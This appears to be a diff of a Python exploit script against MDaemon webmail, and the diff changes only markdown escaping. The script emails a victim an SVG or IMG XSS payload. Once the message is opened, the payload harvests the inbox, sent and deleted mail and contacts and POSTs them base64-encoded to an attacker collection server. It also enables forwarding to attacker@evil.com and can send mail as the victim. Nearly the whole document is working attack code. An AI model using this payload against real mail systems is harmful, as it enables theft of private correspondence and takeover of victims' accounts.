@@ -66,71 +66,71 @@ import smtplib
 
 #---------------------------setting--------------------------------#
 # the attacker's email info #Test with MDaemon email
-mail\_host="test.com"            
-mail\_user="attacker@test.com"     
-mail\_pass="Password123"             
+mail_host="test.com"            
+mail_user="attacker@test.com"     
+mail_pass="Password123"             
 
 # set the victorm
 victim = "victim@test.com"      #MDaemon Email    maildomin.com:3000
 
 # set the keywords
-keywords\_receive = "\[\]"  
-keywords\_send = "\[\]"  
-keywords\_delete = "\[\]"  
-keywords = "\[\]"
+keywords_receive = "[]"  
+keywords_send = "[]"  
+keywords_delete = "[]"  
+keywords = "[]"
 
 # set the max count
-max\_count\_recevie = 300
-max\_count\_send = 300
-max\_count\_delete = 300
+max_count_recevie = 300
+max_count_send = 300
+max_count_delete = 300
 
 # set the browser, chrome has some errors when use svg.
 # in fact,this is no needed. We can put two payloads together in the email.
-browser = 'others'  #\['chrome','others'\]
+browser = 'others'  #['chrome','others']
 
 
 # set the receiver's server.
-xss\_platform = 'http://192.168.142.132/receiveinfo/message\_receive.php'
+xss_platform = 'http://192.168.142.132/receiveinfo/message_receive.php'
 
 # email forward
 ForwardingAddress = 'attacker@evil.com'
 
 #MITM attack
-send\_attack\_to\_who = 'last@test.com'
+send_attack_to_who = 'last@test.com'
 Subject = 'title Hello!'
 body = 'This is body!!!'
 
 # open different functions
-function = \['forwarding','contact','receive','send','delete'\]
-#function = \['test'\]
+function = ['forwarding','contact','receive','send','delete']
+#function = ['test']
 
 
-sent\_content = "THe email content!!!!"
+sent_content = "THe email content!!!!"
 
-def \_format\_addr(s):
+def _format_addr(s):
     name, addr = parseaddr(s)
     return formataddr((Header(name, 'utf-8').encode(), addr))
 
-def send\_mail():
+def send_mail():
 
-    from\_addr = mail\_user
-    password = mail\_pass
-    smtp\_server = mail\_host
-    to\_addr = victim
+    from_addr = mail_user
+    password = mail_pass
+    smtp_server = mail_host
+    to_addr = victim
 
     msg = MIMEMultipart()
-    key\_words = {}
-    content = sent\_content + gen\_js()
+    key_words = {}
+    content = sent_content + gen_js()
 
-    msg\['From'\] = \_format\_addr('%s' % from\_addr)   
-    msg\['To'\] = \_format\_addr('%s' % to\_addr)      
-    msg\['Subject'\] = Header('Read the email!', 'utf-8').encode()  
+    msg['From'] = _format_addr('%s' % from_addr)   
+    msg['To'] = _format_addr('%s' % to_addr)      
+    msg['Subject'] = Header('Read the email!', 'utf-8').encode()  
 
     msg.attach(MIMEText(content, 'html', 'utf-8'))
-    server = smtplib.SMTP(mail\_host, 25)   
-    #server.set\_debuglevel(1)
-    server.login(from\_addr, password)
-    server.sendmail(from\_addr, to\_addr, msg.as\_string())
+    server = smtplib.SMTP(mail_host, 25)   
+    #server.set_debuglevel(1)
+    server.login(from_addr, password)
+    server.sendmail(from_addr, to_addr, msg.as_string())
     server.quit()
 
 
@@ -142,12 +142,12 @@ contact = '''
                 xmlhttp1.open('GET',url,false);
                 xmlhttp1.send(null);
                 response = xmlhttp1.responseText;
-                var to\_send1 = 'a=' + window.btoa(encodeURIComponent(response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
+                var to_send1 = 'a=' + window.btoa(encodeURIComponent(response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                 xmlhttp4=new XMLHttpRequest();
-                server = ' ''' + xss\_platform + ''' '
+                server = ' ''' + xss_platform + ''' '
                 xmlhttp4.open('POST',server,false);
                 xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-                xmlhttp4.send(to\_send1);}catch(error){}
+                xmlhttp4.send(to_send1);}catch(error){}
             '''
 
 receive = '''
@@ -155,131 +155,131 @@ receive = '''
                 if('&View=Main')           
                 newURL1 = currentURL.replace(/BlankMessageBody/,'List');
                 EURL = currentURL.replace(/BlankMessageBody/,'Message');
-                var all\_email = new Array();
-                var max\_count = ''' + str(max\_count\_recevie) + ''';
-                var key\_words =''' + keywords\_receive + ''';
-                var max\_page = 1;
+                var all_email = new Array();
+                var max_count = ''' + str(max_count_recevie) + ''';
+                var key_words =''' + keywords_receive + ''';
+                var max_page = 1;
                 var page=1;
-                for(page;page<max\_page+1;page++){
+                for(page;page<max_page+1;page++){
                 xmlhttp2=new XMLHttpRequest();
                 url1 = newURL1 + decodeURIComponent('%26ReturnJavaScript=1%26FolderID=0%26Page=') + page
                 xmlhttp2.open('GET',url1,false);
                 xmlhttp2.send(null);
                 response1 = xmlhttp2.responseText;
                 data1 =JSON.parse(response1);
-                max\_page = data1.changeMultiPage.totalPages;
+                max_page = data1.changeMultiPage.totalPages;
                 for(var a in data1.scripts){
-                all\_email.push(data1.scripts\[a\].id); } }
-                if(max\_count>=all\_email.length || max\_count==0 ){
-                max\_count=all\_email.length;}
-                for(var i=0;i<max\_count;i++ ){
+                all_email.push(data1.scripts[a].id); } }
+                if(max_count>=all_email.length || max_count==0 ){
+                max_count=all_email.length;}
+                for(var i=0;i<max_count;i++ ){
                 xmlhttp3=new XMLHttpRequest();
-                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=0%26Number=') + all\_email\[i\];
+                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=0%26Number=') + all_email[i];
                 xmlhttp3.open('GET',eurl,false);
                 xmlhttp3.send(null);
-                email\_response = xmlhttp3.responseText;
+                email_response = xmlhttp3.responseText;
                 var flag = 0;
-                if(key\_words.length==0){flag=1;}
-                for(var k in key\_words){
-                if(email\_response.match(key\_words\[k\])!=null){flag=1;}}
+                if(key_words.length==0){flag=1;}
+                for(var k in key_words){
+                if(email_response.match(key_words[k])!=null){flag=1;}}
                 if(flag==0){continue;}
-                var to\_send = 'a=' + window.btoa(encodeURIComponent(email\_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
+                var to_send = 'a=' + window.btoa(encodeURIComponent(email_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                 xmlhttp4=new XMLHttpRequest();
-                server = ' ''' + xss\_platform + ''' '
+                server = ' ''' + xss_platform + ''' '
                 xmlhttp4.open('POST',server,false);
                 xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-                xmlhttp4.send(to\_send); }}catch(error){}
+                xmlhttp4.send(to_send); }}catch(error){}
             '''
 
 send = '''
                 try{                                
                 newURL1 = currentURL.replace(/BlankMessageBody/,'List');
                 EURL = currentURL.replace(/BlankMessageBody/,'Message');
-                var all\_email = new Array();
-                var max\_count = ''' + str(max\_count\_send) + ''';
-                var key\_words =''' + keywords\_send + ''';
-                var max\_page = 1;
+                var all_email = new Array();
+                var max_count = ''' + str(max_count_send) + ''';
+                var key_words =''' + keywords_send + ''';
+                var max_page = 1;
                 var page=1;
-                for(page;page<max\_page+1;page++){
+                for(page;page<max_page+1;page++){
                 xmlhttp2=new XMLHttpRequest();
                 url1 = newURL1 + decodeURIComponent('%26ReturnJavaScript=1%26FolderID=9%26Page=') + page
                 xmlhttp2.open('GET',url1,false);
                 xmlhttp2.send(null);
                 response1 = xmlhttp2.responseText;
                 data1 =JSON.parse(response1);
-                max\_page = data1.changeMultiPage.totalPages;
+                max_page = data1.changeMultiPage.totalPages;
                 for(var a in data1.scripts){
-                all\_email.push(data1.scripts\[a\].id); } }
-                if(max\_count>=all\_email.length || max\_count==0 ){
-                max\_count=all\_email.length;}
-                for(var i=0;i<max\_count;i++ ){
+                all_email.push(data1.scripts[a].id); } }
+                if(max_count>=all_email.length || max_count==0 ){
+                max_count=all_email.length;}
+                for(var i=0;i<max_count;i++ ){
                 xmlhttp3=new XMLHttpRequest();
-                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=9%26Number=') + all\_email\[i\];
+                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=9%26Number=') + all_email[i];
                 xmlhttp3.open('GET',eurl,false);
                 xmlhttp3.send(null);
-                email\_response = xmlhttp3.responseText;
+                email_response = xmlhttp3.responseText;
                 var flag = 0;
-                if(key\_words.length==0){flag=1;}
-                for(var k in key\_words){
-                if(email\_response.match(key\_words\[k\])!=null){flag=1;}}
+                if(key_words.length==0){flag=1;}
+                for(var k in key_words){
+                if(email_response.match(key_words[k])!=null){flag=1;}}
                 if(flag==0){continue;}
-                var to\_send = 'a=' + window.btoa(encodeURIComponent(email\_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
+                var to_send = 'a=' + window.btoa(encodeURIComponent(email_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                 xmlhttp4=new XMLHttpRequest();
-                server = ' ''' + xss\_platform + ''' '
+                server = ' ''' + xss_platform + ''' '
                 xmlhttp4.open('POST',server,false);
                 xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-                xmlhttp4.send(to\_send); }}catch(error){}
+                xmlhttp4.send(to_send); }}catch(error){}
             '''
 
 delete = '''
                 try{                 
                 newURL1 = currentURL.replace(/BlankMessageBody/,'List');
                 EURL = currentURL.replace(/BlankMessageBody/,'Message');
-                var all\_email = new Array();
-                var max\_count = ''' + str(max\_count\_delete) + ''';
-                var key\_words =''' + keywords\_delete + ''';
-                var max\_page = 1;
+                var all_email = new Array();
+                var max_count = ''' + str(max_count_delete) + ''';
+                var key_words =''' + keywords_delete + ''';
+                var max_page = 1;
                 var page=1;
-                for(page;page<max\_page+1;page++){
+                for(page;page<max_page+1;page++){
                 xmlhttp2=new XMLHttpRequest();
                 url1 = newURL1 + decodeURIComponent('%26ReturnJavaScript=1%26FolderID=10%26Page=') + page
                 xmlhttp2.open('GET',url1,false);
                 xmlhttp2.send(null);
                 response1 = xmlhttp2.responseText;
                 data1 =JSON.parse(response1);
-                max\_page = data1.changeMultiPage.totalPages;
+                max_page = data1.changeMultiPage.totalPages;
                 for(var a in data1.scripts){
-                all\_email.push(data1.scripts\[a\].id); } }
-                if(max\_count>=all\_email.length || max\_count==0 ){
-                max\_count=all\_email.length;}
-                for(var i=0;i<max\_count;i++ ){
+                all_email.push(data1.scripts[a].id); } }
+                if(max_count>=all_email.length || max_count==0 ){
+                max_count=all_email.length;}
+                for(var i=0;i<max_count;i++ ){
                 xmlhttp3=new XMLHttpRequest();
-                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=10%26Number=') + all\_email\[i\];
+                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=10%26Number=') + all_email[i];
                 xmlhttp3.open('GET',eurl,false);
                 xmlhttp3.send(null);
-                email\_response = xmlhttp3.responseText;
+                email_response = xmlhttp3.responseText;
                 var flag = 0;
-                if(key\_words.length==0){flag=1;}
-                for(var k in key\_words){
-                if(email\_response.match(key\_words\[k\])!=null){flag=1;}}
+                if(key_words.length==0){flag=1;}
+                for(var k in key_words){
+                if(email_response.match(key_words[k])!=null){flag=1;}}
                 if(flag==0){continue;}
-                var to\_send = 'a=' + window.btoa(encodeURIComponent(email\_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
+                var to_send = 'a=' + window.btoa(encodeURIComponent(email_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                 xmlhttp4=new XMLHttpRequest();
-                server = ' ''' + xss\_platform + ''' '
+                server = ' ''' + xss_platform + ''' '
                 xmlhttp4.open('POST',server,false);
                 xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-                xmlhttp4.send(to\_send); } }catch(error){}
+                xmlhttp4.send(to_send); } }catch(error){}
             '''
 
 forwarding = '''
                 try{                
                 newURL2 = currentURL.replace(/BlankMessageBody/,'Options-Prefs');
                 eurl = newURL2 + decodeURIComponent('%26Save=Yes%26ReturnJavaScript=Yes');
-                var to\_send = decodeURIComponent('ForwardingEnabled=Yes%26ForwardingAddress='''+ ForwardingAddress +'''%26ForwardingRetainCopy=Yes');                
+                var to_send = decodeURIComponent('ForwardingEnabled=Yes%26ForwardingAddress='''+ ForwardingAddress +'''%26ForwardingRetainCopy=Yes');                
                 xmlhttp3=new XMLHttpRequest();
                 xmlhttp3.open('POST',eurl,false);
                 xmlhttp3.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-                xmlhttp3.send(to\_send);}catch(error){}
+                xmlhttp3.send(to_send);}catch(error){}
 
 '''
 
@@ -290,7 +290,7 @@ mitm = '''
                 url = newURL + decodeURIComponent('%26ComposeInNewWindow=Yes%26ChangeView=No%26SendNow=Yes');
                 xmlhttp1.open('POST',url,false);
                 xmlhttp1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-                letter = decodeURIComponent('Attachment=%26ComposeUser=AGdsXhNOEJOGhG7lRyMJ%26ComposeID=1%26Attn=%26Company=%26From=0%26Reply-To=%26SaveSentMessage=No%26To=''' +send\_attack\_to\_who+'''%26CC=%26BCC=%26Subject=t''' + Subject + '''%26Body=test2%26BodyHTML='''+ body +'''\\');
+                letter = decodeURIComponent('Attachment=%26ComposeUser=AGdsXhNOEJOGhG7lRyMJ%26ComposeID=1%26Attn=%26Company=%26From=0%26Reply-To=%26SaveSentMessage=No%26To=''' +send_attack_to_who+'''%26CC=%26BCC=%26Subject=t''' + Subject + '''%26Body=test2%26BodyHTML='''+ body +'''\');
                 xmlhttp1.send(letter);
                 response = xmlhttp1.responseText;}catch(error){}
 '''
@@ -310,43 +310,43 @@ user = '''
                 if(currentURL.indexOf('View=Main') > 0){
                 currentURL = currentURL.replace(/Main/,'BlankMessageBody');}
 '''
-#function = \['forwarding','contact','receive','send','delete','mitm'\]
-def gen\_js():
+#function = ['forwarding','contact','receive','send','delete','mitm']
+def gen_js():
     if browser == 'chrome':     
-        attact\_js = '''<img/<!----test----/onerror="''' + user
+        attact_js = '''<img/<!----test----/onerror="''' + user
         if 'forwarding' in function:
-            attact\_js += forwarding     
+            attact_js += forwarding     
         if 'mitm' in function:
-            attact\_js += mitm  
+            attact_js += mitm  
         if 'contact' in function:
-            attact\_js += contact  
+            attact_js += contact  
         if 'receive' in function:
-            attact\_js += receive  
+            attact_js += receive  
         if 'send' in function:
-            attact\_js += send  
+            attact_js += send  
         if 'delete' in function:
-            attact\_js += delete  
+            attact_js += delete  
         if 'test' in function:
-            attact\_js += test  
-        attact\_js += '''" src="#">'''  
+            attact_js += test  
+        attact_js += '''" src="#">'''  
     else:
-        attact\_js = '''<svg/<!----test----/onload="''' + user
+        attact_js = '''<svg/<!----test----/onload="''' + user
         if 'forwarding' in function:
-            attact\_js += forwarding     
+            attact_js += forwarding     
         if 'mitm' in function:
-            attact\_js += mitm   
+            attact_js += mitm   
         if 'contact' in function:
-            attact\_js += contact  
+            attact_js += contact  
         if 'receive' in function:
-            attact\_js += receive  
+            attact_js += receive  
         if 'send' in function:
-            attact\_js += send  
+            attact_js += send  
         if 'delete' in function:
-            attact\_js += delete  
+            attact_js += delete  
         if 'test' in function:
-            attact\_js += test                    
-        attact\_js += '''">'''  
-    return attact\_js
+            attact_js += test                    
+        attact_js += '''">'''  
+    return attact_js
 
-send\_mail()
+send_mail()
 ```
